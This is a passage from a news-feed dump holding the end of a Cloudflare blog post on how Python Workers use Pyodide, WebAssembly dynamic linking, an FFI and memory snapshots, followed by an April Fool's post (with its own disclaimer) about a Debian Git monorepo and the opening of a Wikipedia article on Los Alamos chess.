accompanying JavaScript library that implements these imported functions.</li></ol><p>Pyodide uses Emscripten, and provides three things:</p><ol><li>A distribution of the CPython interpreter, compiled using Emscripten</li><li>A foreign function interface (FFI) between Python and JavaScript</li><li>A set of third-party Python packages, compiled using Emscripten’s compiler to WebAssembly. </li></ol><p>Of these targets, only Emscripten currently supports dynamic linking, which, as we noted above, is essential to providing a shared language runtime for Python that is shared across isolates. Emscripten does this by <a href="https://emscripten.org/docs/compiling/Dynamic-Linking.html">providing implementations of dlopen and dlsym,</a> which use the accompanying JavaScript library to modify the WebAssembly program’s table to link additional WebAssembly-compiled modules at runtime. WASI <a href="https://github.com/WebAssembly/component-model/blob/main/design/mvp/examples/SharedEverythingDynamicLinking.md#runtime-dynamic-linking">does not yet support</a> the dlopen/dlsym dynamic linking abstractions used by CPython.</p><h2 id="pyodide-and-the-magic-of-foreign-function-interfaces-ffi">Pyodide and the magic of foreign function interfaces (FFI)</h2><p>You might have noticed that in our Hello World Python Worker, we import Response from the js module:</p><pre><code>from js import Response

async def on_fetch(request, env):
    return Response.new("Hello world!")</code></pre><p>Why is that?</p><p>Most Workers are written in JavaScript, and most of our engineering effort on the Workers runtime goes into improving JavaScript Workers. There is a risk in adding a second language that it might never reach feature parity with the first language and always be a second class citizen. Pyodide’s foreign function interface (FFI) is critical to avoiding this by providing access to all JavaScript functionality from Python. This can be used by the Worker author directly, and it is also used to make packages like <a href="https://developers.cloudflare.com/workers/languages/python/packages/fastapi/">FastAPI</a> and <a href="https://developers.cloudflare.com/workers/languages/python/packages/langchain/">Langchain</a> work out-of-the-box, as we’ll show later in this post.</p><p>An FFI is a system for calling functions in one language that are implemented in another language. In most cases, an FFI is defined by a "higher-level" language in order to call functions implemented in a systems language, often C. Python’s <a href="https://docs.python.org/3/library/ctypes.html#module-ctypes">ctypes module</a> is such a system. These sorts of foreign function interfaces are often difficult to use because of the nature of C APIs.</p><p>Pyodide’s foreign function interface is an interface between Python and JavaScript, which are two high level object-oriented languages with a lot of design similarities. When passed from one language to another, immutable types such as strings and numbers are transparently translated. All mutable objects are wrapped in an appropriate proxy.</p><p>When a JavaScript object is passed into Python, Pyodide determines which JavaScript protocols the object supports and <a href="https://github.com/pyodide/pyodide/blob/main/src/core/jsproxy.c#L3781-L3791">dynamically constructs</a> an appropriate Python class that implements the corresponding Python protocols. For example, if the JavaScript object supports the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols">JavaScript iteration protocol</a> then the proxy will support the <a href="https://docs.python.org/3/library/stdtypes.html#iterator-types">Python iteration protocol</a>. If the JavaScript object is a Promise or other <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise#thenables">thenable</a>, the Python object will be an <a href="https://docs.python.org/3/reference/datamodel.html#awaitable-objects">awaitable</a>.</p><pre><code>from js import JSON

js_array = JSON.parse("[1,2,3]")

for entry in js_array:
   print(entry)</code></pre><p>The lifecycle of a request to a Python Worker makes use of Pyodide’s FFI, wrapping the incoming JavaScript <a href="https://developers.cloudflare.com/workers/runtime-apis/request/">Request</a> object in a <a href="https://pyodide.org/en/stable/usage/api/python-api/ffi.html#pyodide.ffi.JsProxy">JsProxy</a> object that is accessible in your Python code. It then converts the value returned by the Python Worker’s <a href="https://developers.cloudflare.com/workers/runtime-apis/handlers/">handler</a> into a JavaScript <a href="https://developers.cloudflare.com/workers/runtime-apis/response/">Response</a> object that can be delivered back to the client:</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/Python-Worker-Request-Lifecycle.png" alt="" loading="lazy" width="978" height="400"></figure><h2 id="why-dynamic-linking-is-essential-and-static-linking-isn%E2%80%99t-enough">Why dynamic linking is essential, and static linking isn’t enough</h2><p>Python comes with <a href="https://cffi.readthedocs.io/en/stable/">a C FFI</a>, and many Python packages use this FFI to import native libraries. These libraries are typically written in C, so they must first be compiled down to WebAssembly in order to work on the Workers runtime. As we noted above, Pyodide is built with Emscripten, which overrides Python’s C FFI — any time a package tries to load a native library, it is instead loaded from a WebAssembly module that is provided by the Workers runtime. Dynamic linking is what makes this possible — it is what lets us override Python’s C FFI, allowing Pyodide to support many <a href="https://developers.cloudflare.com/workers/languages/python/packages/">Python packages</a> that have native library dependencies.</p><p>Dynamic linking is “pay as you go”, while static linking is “pay upfront” — if code is statically linked into your binary, it must be loaded upfront in order for the binary to run, even if this code is never used.</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/Python-Workers---Runtime.png" alt="" loading="lazy" width="772" height="400"></figure><p>Dynamic linking enables the Workers runtime to share the underlying WebAssembly modules of packages across different Workers that are running on the same machine.</p><p>We won’t go too much into detail on <a href="https://emscripten.org/docs/compiling/Dynamic-Linking.html#runtime-dynamic-linking-with-dlopen">how dynamic linking works in Emscripten</a>, but the main takeaway is that the Emscripten runtime fetches WebAssembly modules from a filesystem abstraction provided in JavaScript. For each Worker, we generate a filesystem at runtime, whose structure mimics a Python distribution that has the Worker’s dependencies installed, but whose underlying files are shared between Workers. This makes it possible to share Python and WebAssembly files between multiple Workers that import the same dependency. Today, we’re able to share these files across Workers, but copy them into each new isolate. We think we can go even further, by employing <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> techniques to share the underlying resource across many Workers.</p><h2 id="supporting-server-and-client-libraries">Supporting Server and Client libraries</h2><p>Python has a wide variety of popular HTTP client libraries, including <a href="https://www.python-httpx.org/">httpx</a>, <a href="https://pypi.org/project/urllib3/">urllib3</a>, <a href="https://pypi.org/project/requests/">requests</a> and more. Unfortunately, none of them work out of the box in Pyodide. Adding support for these has been one of the longest running user requests for the Pyodide project. The Python HTTP client libraries all work with raw sockets, and the browser security model and CORS do not allow this, so we needed another way to make them work in the Workers runtime.</p><h3 id="async-client-libraries">Async Client libraries</h3><p>For libraries that can make requests asynchronously, including <a href="https://docs.aiohttp.org/en/stable/index.html">aiohttp</a> and <a href="https://www.python-httpx.org/">httpx</a>, we can use the <a href="https://developers.cloudflare.com/workers/runtime-apis/fetch/">Fetch API</a> to make requests. We do this by patching the library, instructing it to use the Fetch API from JavaScript — taking advantage of Pyodide’s FFI. <a href="https://github.com/cloudflare/pyodide/blob/main/packages/httpx/httpx_patch.py">The httpx patch</a> ends up quite simple —fewer than 100 lines of code. Simplified even further, it looks like this:<br></p><pre><code>from js import Headers, Request, fetch

def py_request_to_js_request(py_request):
    js_headers = Headers.new(py_request.headers)
    return Request.new(py_request.url, method=py_request.method, headers=js_headers)

def js_response_to_py_response(js_response):
  ... # omitted

async def do_request(py_request):
  js_request = py_request_to_js_request(py_request)
    js_response = await fetch(js_request)
    py_response = js_response_to_py_response(js_response)
    return py_response</code></pre><h3 id="synchronous-client-libraries">Synchronous Client libraries</h3><p>Another challenge in supporting Python HTTP client libraries is that many Python APIs are synchronous. For these libraries, we cannot use the <a href="https://developers.cloudflare.com/workers/runtime-apis/fetch/">fetch API</a> directly because it is asynchronous. </p><p>Thankfully, Joe Marshall recently landed <a href="https://urllib3.readthedocs.io/en/stable/reference/contrib/emscripten.html">a contribution to urllib3</a> that adds Pyodide support in web browsers by:</p><ol><li>Checking if blocking with <code>Atomics.wait()</code> is possible<br>a. If so, start a fetch worker thread<br>b. Delegate the fetch operation to the worker thread and serialize the response into a SharedArrayBuffer<br>c. In the Python thread, use Atomics.wait to block for the response in the SharedArrayBuffer</li><li>If <code>Atomics.wait()</code> doesn’t work, fall back to a synchronous XMLHttpRequest</li></ol><p>Despite this, today Cloudflare Workers do not support <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers">worker threads</a> or synchronous <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a>, so neither of these two approaches will work in Python Workers. We do not support synchronous requests today, but there is a way forward…</p><h3 id="webassembly-stack-switching">WebAssembly Stack Switching</h3><p>There is an approach which will allow us to support synchronous requests. WebAssembly has <a href="https://github.com/WebAssembly/js-promise-integration">a stage 3 proposal adding support for stack switching</a>, which <a href="https://v8.dev/blog/jspi">v8 has an implementation of</a>. Pyodide contributors have been working on adding support for stack switching to Pyodide since September of 2022, and it is almost ready. </p><p>With this support, Pyodide exposes a function called <code>run_sync</code> which can block for completion of an awaitable:</p><pre><code>from pyodide.ffi import run_sync

def sync_fetch(py_request):
   js_request = py_request_to_js_request(py_request)
   js_response  = run_sync(fetch(js_request))
   return js_response_to_py_response(js_response)</code></pre><h3 id="fastapi-and-python%E2%80%99s-asynchronous-server-gateway-interface">FastAPI and Python’s Asynchronous Server Gateway Interface</h3><p><a href="https://fastapi.tiangolo.com/">FastAPI</a> is one of the most popular libraries for defining Python servers. FastAPI applications use a protocol called the <a href="https://asgi.readthedocs.io/en/latest/">Asynchronous Server Gateway Interface</a> (ASGI). This means that FastAPI never reads from or writes to a socket itself. An ASGI application expects to be hooked up to an ASGI server, typically <a href="https://www.uvicorn.org/">uvicorn</a>. The ASGI server handles all of the raw sockets on the application’s behalf.</p><p>Conveniently for us, this means that FastAPI works in Cloudflare Workers without any patches or changes to FastAPI itself. We simply need to replace <a href="https://www.uvicorn.org/">uvicorn</a> with an appropriate ASGI server that can run within a Worker. Our initial implementation lives <a href="https://github.com/cloudflare/workerd/blob/main/src/pyodide/internal/asgi.py">here</a>, in <a href="https://github.com/cloudflare/pyodide">the fork of Pyodide</a> that we maintain. We hope to add a more comprehensive feature set, add test coverage, and then upstream this implementation into Pyodide.</p><p>You can try this yourself by cloning <a href="https://github.com/cloudflare/python-workers-examples">cloudflare/python-workers-examples</a>, and running <code>npx wrangler@latest dev</code> in the directory of the FastAPI example.</p><h2 id="importing-python-packages">Importing Python Packages</h2><p>Python Workers support <a href="https://developers.cloudflare.com/workers/languages/python/packages/">a subset of Python packages</a>, which are <a href="https://github.com/cloudflare/pyodide/tree/main/packages">provided directly by Pyodide</a>, including <a href="https://numpy.org/">numpy</a>, <a href="https://www.python-httpx.org/">httpx</a>, <a href="https://developers.cloudflare.com/workers/languages/python/packages/fastapi/">FastAPI</a>, <a href="https://developers.cloudflare.com/workers/languages/python/packages/langchain/">Langchain</a>, and more. This ensures compatibility with the Pyodide runtime by pinning package versions to Pyodide versions, and allows Pyodide to patch internal implementations, as we showed above in the case of httpx.</p><p>To import a package, simply add it to your <code>requirements.txt</code> file, without adding a version number. A specific version of the package is provided directly by Pyodide. Today, you can use packages in local development, and in the coming weeks, you will be able to deploy Workers that define dependencies in a <code>requirements.txt</code> file. Later in this post, we’ll show how we’re thinking about managing new versions of Pyodide and packages.</p><p>We maintain our own fork of Pyodide, which allows us to provide patches specific to the Workers runtime, and to quickly expand our support for packages in Python Workers, while also committing to upstreaming our changes back to Pyodide, so that the whole ecosystem of developers can benefit.</p><p>Python packages are often big and memory hungry though, and they can do a lot of work at import time. How can we ensure that you can bring in the packages you need, while mitigating long cold start times?</p><h2 id="making-cold-starts-faster-with-memory-snapshots">Making cold starts faster with memory snapshots</h2><p>In the example at the start of this post, in local development, we mentioned injecting Pyodide into your Worker. Pyodide itself is 6.4MB — and Python packages can also be quite large.</p><p>If we simply shoved Pyodide into your Worker and uploaded it to Cloudflare, that’d be quite a large Worker to load into a new isolate — cold starts would be slow. On a fast computer with a good network connection, Pyodide takes about two seconds to initialize in a web browser, one second of network time and one second of cpu time. It wouldn’t be acceptable to initialize it every time you update your code for every isolate your Worker runs in across <a href="https://www.cloudflare.com/network/">Cloudflare’s network</a>.</p><p>Instead, when you run <a href="https://developers.cloudflare.com/workers/wrangler/commands/#deploy">npx wrangler@latest deploy</a>, the following happens:</p><ol><li>Wrangler uploads your Python code and your <code>requirements.txt</code> file to the Workers API</li><li>We send your Python code, and your <code>requirements.txt</code> file to the Workers runtime to be validated</li><li>We create a new isolate for your Worker, and automatically inject Pyodide plus any <a href="https://developers.cloudflare.com/workers/languages/python/packages/">packages</a> you’ve specified in your <code>requirements.txt</code> file.</li><li>We scan the Worker’s code for import statements, execute them, and then take a snapshot of the Worker’s WebAssembly linear memory. Effectively, we perform the expensive work of importing packages at deploy time, rather than at runtime.</li><li>We deploy this snapshot alongside your Worker’s Python code to Cloudflare’s network.</li><li>Just like a JavaScript Worker, we execute the Worker’s <a href="https://developers.cloudflare.com/workers/platform/limits/#worker-startup-time">top-level scope</a>.</li></ol><p>When a request comes in to your Worker, we load this snapshot and use it to bootstrap your Worker in an isolate, avoiding expensive initialization time:</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/apipyth.png" alt="" loading="lazy" width="1200" height="475"></figure><p>This takes cold starts for a basic Python Worker down to below 1 second. We’re not yet satisfied with this though. We’re confident that we can drive this down much, much further. How? By reusing memory snapshots.</p><h3 id="reusing-memory-snapshots">Reusing Memory Snapshots</h3><p>When you upload a Python Worker, we generate a single memory snapshot of the Worker’s top-level imports, including both Pyodide and any dependencies. This snapshot is specific to your Worker. It can’t be shared, even though most of its contents are the same as other Python Workers.</p><p>Instead, we can create a single, shared snapshot ahead of time, and preload it into a pool of “pre-warmed” isolates. These isolates would already have the Pyodide runtime loaded and ready — making a Python Worker work just like a JavaScript Worker. In both cases, the underlying interpreter and execution environment is provided by the Workers runtime, and available on-demand without delay. The only difference is that with Python, the interpreter runs in WebAssembly, within the Worker.</p><p>Snapshots are a common pattern across runtimes and execution environments. Node.js <a href="https://docs.google.com/document/d/1YEIBdH7ocJfm6PWISKw03szNAgnstA2B3e8PZr_-Gp4/edit#heading=h.1v0pvnoifuah">uses V8 snapshots to speed up startup time</a>. You can take <a href="https://github.com/firecracker-microvm/firecracker/blob/main/docs/snapshotting/snapshot-support.md">snapshots of Firecracker microVMs</a> and resume execution in a different process. There’s lots more we can do here — not just for Python Workers, but for Workers written in JavaScript as well, caching snapshots of compiled code from top-level scope and the state of the isolate itself. Workers are so fast and efficient that to-date we haven’t had to take snapshots in this way, but we think there are still big performance gains to be had.</p><p>This is our biggest lever towards driving cold start times down over the rest of 2024.</p><h2 id="future-proofing-compatibility-with-pyodide-versions-and-compatibility-dates">Future proofing compatibility with Pyodide versions and Compatibility Dates</h2><p>When you deploy a Worker to Cloudflare, you expect it to keep running indefinitely, even if you never update it again. There are Workers deployed in 2018 that are still running just fine in production.</p><p>We achieve this using <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/">Compatibility Dates</a> and <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/#compatibility-flags">Compatibility Flags</a>, which provide explicit opt-in mechanisms for new behavior and potentially backwards-incompatible changes, without impacting existing Workers.</p><p>This works in part because it mirrors how the Internet and web browsers work. You publish a web page with some JavaScript, and rightly expect it to work forever. Web browsers and Cloudflare Workers have the same type of commitment of stability to developers.</p><p>There is a challenge with Python though — both Pyodide and CPython are <a href="https://devguide.python.org/versions/">versioned</a>. Updated versions are published regularly and can contain breaking changes. And Pyodide provides a set of <a href="https://developers.cloudflare.com/workers/languages/python/packages/">built-in packages</a>, each with a pinned version number. This presents a question — how should we allow you to update your Worker to a newer version of Pyodide?</p><p>The answer is <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/">Compatibility Dates</a> and <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/#compatibility-flags">Compatibility Flags</a>.</p><p>A new version of Python is released every year in August, and a new version of Pyodide is released six (6) months later. When this new version of Pyodide is published, we will add it to Workers by gating it behind a Compatibility Flag, which is only enabled after a specified Compatibility Date. This lets us continually provide updates, without risk of breaking changes, extending the commitment we’ve made for JavaScript to Python.</p><p>Each Python release has a <a href="https://devguide.python.org/versions/">five (5) year support window</a>. Once this support window has passed for a given version of Python, security patches are no longer applied, making this version unsafe to rely on. To mitigate this risk, while still trying to hold as true as possible to our commitment of stability and long-term support, after five years any Python Worker still on a Python release that is outside of the support window will be automatically moved forward to the next oldest Python release. Python is a mature and stable language, so we expect that in most cases, your Python Worker will continue running without issue. But we recommend updating the compatibility date of your Worker regularly, to stay within the support window.</p><p>In between Python releases, we also expect to update and add additional <a href="https://developers.cloudflare.com/workers/languages/python/packages/%5C">Python packages</a>, using the same opt-in mechanism. A Compatibility Flag will be a combination of the Python version and the release date of a set of packages. For example, <strong>python_3.17_packages_2025_03_01</strong>.</p><h2 id="how-bindings-work-in-python-workers">How bindings work in Python Workers</h2><p>We mentioned earlier that Pyodide provides a foreign function interface (FFI) to JavaScript — meaning that you can directly use JavaScript objects, methods, functions and more, directly from Python.</p><p>This means that from day one, all <a href="https://developers.cloudflare.com/workers/configuration/bindings/">binding</a> APIs to other Cloudflare resources are supported in Cloudflare Workers. The env object that is provided by handlers in Python Workers is a JavaScript object that Pyodide provides a proxy API to, handling <a href="https://pyodide.org/en/stable/usage/type-conversions.html">type translations</a> across languages automatically.</p><p>For example, to write to and read from a <a href="https://developers.cloudflare.com/kv/">KV</a> namespace from a Python Worker, you would write:</p><pre><code>from js import Response

async def on_fetch(request, env):
    await env.FOO.put("bar", "baz")
    bar = await env.FOO.get("bar")
    return Response.new(bar) # returns "baz"</code></pre><p>This works for Web APIs too — see how Response is imported from the js module? You can import any global from JavaScript this way.</p><h2 id="get-this-javascript-out-of-my-python">Get this JavaScript out of my Python!</h2><p>You’re probably reading this post because you want to write Python <em>instead</em> of JavaScript. <code>from js import Response</code> just isn’t Pythonic. We know — and we have actually tackled this challenge before for another language (<a href="https://blog.cloudflare.com/workers-rust-sdk">Rust</a>). And we think we can do this even better for Python.</p><p>We launched <a href="https://github.com/cloudflare/workers-rs">workers-rs</a> in 2021 to make it possible to write Workers in <a href="https://www.rust-lang.org/">Rust</a>. For each JavaScript API in Workers, we, alongside open-source contributors, have written bindings that expose a more idiomatic Rust API.</p><p>We plan to do the same for Python Workers — starting with the bindings to <a href="https://developers.cloudflare.com/workers-ai/">Workers AI</a> and <a href="https://developers.cloudflare.com/vectorize/">Vectorize</a>. But while workers-rs requires that you use and update an external dependency, the APIs we provide with Python Workers will be built into the Workers runtime directly. Just update your compatibility date, and get the latest, most Pythonic APIs.</p><p>This is about more than just making bindings to resources on Cloudflare more Pythonic though — it’s about compatibility with the ecosystem.</p><p>Similar to how we <a href="https://github.com/cloudflare/workers-rs/pull/477">recently converted</a> workers-rs to use types from the <a href="https://crates.io/crates/http">http</a> crate, which makes it easy to use the <a href="https://docs.rs/axum/latest/axum/">axum</a> crate for routing, we aim to do the same for Python Workers. For example, the Python standard library provides a <a href="https://docs.python.org/3/library/socket.html">raw socket API</a>, which many Python packages depend on. Workers already provides <a href="https://developers.cloudflare.com/workers/runtime-apis/tcp-sockets/">connect()</a>, a JavaScript API for working with raw sockets. We see ways to provide at least a subset of the Python standard library’s socket API in Workers, enabling a broader set of Python packages to work on Workers, with less of a need for patches.</p><p>But ultimately, we hope to kick start an effort to create a standardized serverless API for Python. One that is easy to use for any Python developer and offers the same capabilities as JavaScript.</p><h2 id="we%E2%80%99re-just-getting-started-with-python-workers">We’re just getting started with Python Workers</h2><p>Providing true support for a new programming language is a big investment that goes far beyond making “hello world” work. We chose Python very intentionally — it’s the <a href="https://survey.stackoverflow.co/2023/#technology-most-popular-technologies">second most popular programming language after JavaScript</a> — and we are committed to continuing to improve performance and widen our support for Python packages.</p><p>We’re grateful to the Pyodide maintainers and the broader Python community — and we’d love to hear from you. Drop into the Python Workers channel in the <a href="https://discord.cloudflare.com/">Cloudflare Developers Discord</a>, or <a href="https://github.com/cloudflare/workerd/discussions/categories/python-packages">start a discussion on Github</a> about what you’d like to see next and which Python packages you’d like us to support.</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/Workers-and-Python.png" alt="" loading="lazy" width="1600" height="421"></figure></div></section><div><p>We protect <a target="_blank" href="https://www.cloudflare.com/network-services/" rel="noreferrer">entire corporate networks</a>, help customers build <a target="_blank" href="https://workers.cloudflare.com/" rel="noreferrer">Internet-scale applications efficiently</a>, accelerate any <a target="_blank" href="https://www.cloudflare.com/performance/accelerate-internet-applications/" rel="noreferrer">website or Internet application</a>, <a target="_blank" href="https://www.cloudflare.com/ddos/" rel="noreferrer">ward off DDoS attacks</a>, keep <a target="_blank" href="https://www.cloudflare.com/application-security/" rel="noreferrer">hackers at bay</a>, and can help you on <a target="_blank" href="https://www.cloudflare.com/products/zero-trust/" rel="noreferrer">your journey to Zero Trust</a>.</p><p>Visit <a target="_blank" href="https://one.one.one.one/" rel="noreferrer">1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.</p><p>To learn more about our mission to help build a better Internet, <a target="_blank" href="https://www.cloudflare.com/learning/what-is-cloudflare/" rel="noreferrer">start here</a>. If you're looking for a new career direction, check out <a target="_blank" href="https://www.cloudflare.com/careers" rel="noreferrer">our open positions</a>.</p></div><a href="https://blog.cloudflare.com/tag/developers">Developers</a><a href="https://blog.cloudflare.com/tag/workers">Cloudflare Workers</a><a href="https://blog.cloudflare.com/tag/webassembly">WebAssembly</a><a href="https://blog.cloudflare.com/tag/python">Python</a><a href="https://blog.cloudflare.com/tag/developer-platform">Developer Platform</a><a href="https://blog.cloudflare.com/tag/wasm">WASM</a><a href="https://blog.cloudflare.com/tag/developer-week">Developer Week</a></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Debian Git Monorepo (214 pts)]]></title>
            <link>https://blog.liw.fi/posts/2024/monorepo/</link>
            <guid>39903742</guid>
            <pubDate>Tue, 02 Apr 2024 09:16:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.liw.fi/posts/2024/monorepo/">https://blog.liw.fi/posts/2024/monorepo/</a>, See on <a href="https://news.ycombinator.com/item?id=39903742">Hacker News</a></p>
<div id="readability-page-1" class="page"><article class="page">
    

    

    <section id="pagebody">
	<p><a href="https://liw.fi/">Lars Wirzenius Consulting Ltd</a> has created a Git repository with the source code of Debian 12 (bookworm), the <code>main</code> component. It’s one repository for all the source code, as one commit. It’s a <a href="https://en.wikipedia.org/wiki/Monorepo">monorepo</a>.</p>
<p>To clone the repository (but read below before you run this):</p>
<pre><code>git clone https://monorepo.liw.fi/git/debian</code></pre>
<p>Please be kind to the proof-of-concept Git server and avoid cloning if 42 or more people are already cloning. The checkout will take a few hours and use about 500 GiB disk space, and have about 15 million files outside <code>.git</code>.</p>
<p>This is a read-only repository that will need to be moved onto Debian infrastructure before it’s actually usable for collaboration.</p>
<h2 id="motivation">Motivation</h2>
<p>The monorepo will greatly simplify and improve the development process of Debian:</p>
<ul>
<li><p>Simpler collaboration: every package uses the same process, and the same tools, and it’ll be easier than ever to help with other people’s packages.</p></li>
<li><p>Transitions are easier: all changes will be prepared in one branch and merged atomically, rather than uploading each source package separately.</p></li>
<li><p>Enables distribution-wide changes in general: With all the source code for everything in one tree, in on repository, it’s feasible to make changes to Debian that affect many packages. For example, back in the day Debian took seven years to migrate <code>/usr/doc</code> to <code>/usr/share/doc</code>, and that can now be done in one commit.</p></li>
<li><p>Easier to see what has changed: the release notes maintainers will especially appreciate this. In the future, Debian release notes will be excruciatingly detailed. They will no longer merely say “bug fixes and improvements”.</p></li>
<li><p>Better non-free management: if a package in main is ever found to contain non-free code, it can be removed using <code>git filter-branch</code>.</p></li>
<li><p>Better quality control: merges will only be happen after CI tests pass, using the <a href="https://bors.rust-lang.org/"><code>bors</code></a> tool from the developers of the Rust language. Currently packages are tested only after they’ve already been uploaded to the Debian archive. The change will reduce problems for people running the unstable branch of Debian in production. Soon there will be no bugs in unstable.</p></li>
<li><p>More development speed: because Debian developers will no longer need to spend time fixing bugs in unstable, and maintaining the Debian bug tracker, they will have more time and energy to update packages to newer versions. This, in turn, will motivate large enterprise users of Debian to fund Debian development more, as their primary complaint of the slow pace of change will finally be solved.</p></li>
</ul>
<h2 id="future-of-.dsc">Future of “.dsc”</h2>
<p>There will be no further need for the legacy <code>.dsc</code> source package format. Instead, a copy of the monorepo can be shipped.</p>
<h2 id="resource-use">Resource use</h2>
<p>The monorepo is not small. However, given how important Debian is to their business, companies like Apple, Microsoft, Amazon, and Google, are already chomping at the bit to donate hardware and cloud resources to enable use of the monorepo. Expect an announcement on <code>debian-devel-announce</code> as soon as details have been worked out.</p>
<h2 id="implementation">Implementation</h2>
<p>The program <a href="https://app.radicle.xyz/nodes/radicle.liw.fi/rad:zgYpM7b29D6wTMjEUxxzBjcF9EvK">unpack-debian-sources</a> is available on the <a href="https://radicle.xyz/">Radicle</a> network as repository ID <code>rad:zgYpM7b29D6wTMjEUxxzBjcF9EvK</code>. Running it took about seven hours on my home computer. After that finished, I created the repository with the following commands:</p>
<pre><code>git init .
git add -v .
git commit -m "Debian 12 (bookworm), main"</code></pre>
<p>The <code>git add</code> took about 3.5 hours and <code>git commit</code> took another 2.5 hours. This required 16 GiB RAM to work. Since I’ve already done this, nobody else needs to. Everyone else can just clone, from my server or each other. The commit is:</p>
<pre><code>commit 8ae3129b9f222534d6ed20dd0489fb8f2f1d1a97 (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Lars Wirzenius &lt;liw@liw.fi&gt;
Date:   Tue Mar 19 11:05:57 2024 +0000

    Debian 12 main</code></pre>
<p>Have fun!</p>
<h2 id="disclaimer">Disclaimer</h2>
<p>This blog post is an April Fool’s joke. Debian is not moving to a monorepo. I have not been a member of Debian since 2018. I don’t speak for Debian. I would be very surprised if Debian would abandon its current development model of being developer and package centric. I don’t even think it’d be sensible for Debian to have a monorepo. The monorepo is real, though it will be deleted by the end of April.</p>
<p>The real motivation for all this is that I sometimes like to be cruel to my tools. This time, I’m cruel to Git: can it handle a repository of this size? In 2009 it could not. In 2024 it can.</p>

      </section>

  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Los Alamos Chess (212 pts)]]></title>
            <link>https://en.wikipedia.org/wiki/Los_Alamos_chess</link>
            <guid>39903738</guid>
            <pubDate>Tue, 02 Apr 2024 09:15:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://en.wikipedia.org/wiki/Los_Alamos_chess">https://en.wikipedia.org/wiki/Los_Alamos_chess</a>, See on <a href="https://news.ycombinator.com/item?id=39903738">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
							

						<p>From Wikipedia, the free encyclopedia</p>
					</div><div lang="en" dir="ltr" id="mw-content-text">

<p><b>Los Alamos chess</b> (or <b>anti-clerical chess</b><sup id="cite_ref-Anderson_1-0"><a href="#cite_note-Anderson-1">[1]</a></sup>) is a <a href="https://en.wikipedia.org/wiki/Chess_variant" title="Chess variant">chess variant</a> played on a <a href="https://en.wikipedia.org/wiki/Minichess" title="Minichess">6×6 board</a> without <a href="https://en.wikipedia.org/wiki/Bishop_(chess)" title="Bishop (chess)">bishops</a>. This was the first chess-like game played by a computer program. This program was written at <a href="https://en.wikipedia.org/wiki/Los_Alamos_National_Laboratory" title="Los Alamos National Laboratory">Los Alamos Scientific Laboratory</a> by <a href="https://en.wikipedia.org/w/index.php?title=Paul_Stein_(computer_scientist)&amp;action=edit&amp;redlink=1" title="Paul Stein (computer scientist) (page does not exist)">Paul Stein</a> and <a href="https://en.wikipedia.org/w/index.php?title=Mark_Wells_(computer_scientist)&amp;action=edit&amp;redlink=1" title="Mark Wells (computer scientist) (page does not exist)">Mark Wells</a> for the <span><a href="https://en.wikipedia.org/wiki/MANIAC_I" title="MANIAC I">MANIAC I</a></span> computer<sup id="cite_ref-Pritchard94_2-0"><a href="#cite_note-Pritchard94-2">[2]</a></sup> in 1956. The reduction of the board size and the number of pieces from standard <a href="https://en.wikipedia.org/wiki/Chess" title="Chess">chess</a> was due to the very limited capacity of computers at the time. The computer still needed about 20 minutes between moves.
</p><p>The program was very simple, containing only about 600 instructions. It was mostly a <a href="https://en.wikipedia.org/wiki/Minimax" title="Minimax">minimax</a> <a href="https://en.wikipedia.org/wiki/Tree_traversal" title="Tree traversal">tree search</a> and could look four <a href="https://en.wikipedia.org/wiki/Ply_(game_theory)" title="Ply (game theory)">plies</a> ahead. For scoring the board at the end of the four-ply lookahead, it estimates a score for <a href="https://en.wikipedia.org/wiki/Glossary_of_chess#Material" title="Glossary of chess">material</a> and a score for <a href="https://en.wikipedia.org/wiki/Glossary_of_chess#Mobility" title="Glossary of chess">mobility</a>, then adds them. Pseudocode for the chess program is described in Figure 11.4 of Newell, 2019.<sup id="cite_ref-:0_3-0"><a href="#cite_note-:0-3">[3]</a></sup> In 1958, a revised version was written for <a href="https://en.wikipedia.org/wiki/MANIAC_II" title="MANIAC II">MANIAC II</a> for full 8×8 chess, though its pseudocode was never published. There is a record of a single game by it, circa November 1958 (Table 11.2 of Newell, 2019<sup id="cite_ref-:0_3-1"><a href="#cite_note-:0-3">[3]</a></sup>).
</p>
<meta property="mw:PageProp/toc">
<h2><span id="Game_rules">Game rules</span><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Los_Alamos_chess&amp;action=edit&amp;section=1" title="Edit section: Game rules"><span>edit</span></a><span>]</span></span></h2>
